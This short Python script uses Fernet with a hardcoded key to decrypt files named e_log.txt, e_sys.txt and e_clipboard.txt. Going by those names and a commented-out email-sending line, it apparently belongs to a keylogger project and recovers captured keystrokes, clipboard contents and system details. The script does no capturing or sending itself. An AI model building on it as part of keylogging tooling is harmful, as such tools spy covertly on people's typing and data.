from cryptography.fernet import Fernet

key = "lr-P4dNajeFXLopKXhy2nhXyHRLIsyyWu9-4IEZJcBE="

keys_information_e = "e_log.txt"
system_information_e = "e_sys.txt"
clipboard_information_e = "e_clipboard.txt"

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_file in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb')as f:
        f.write(decrypted)

    # send_email(encrypted_file_names[count], encrypted_file_names[count] ,toaddr)
    count +=1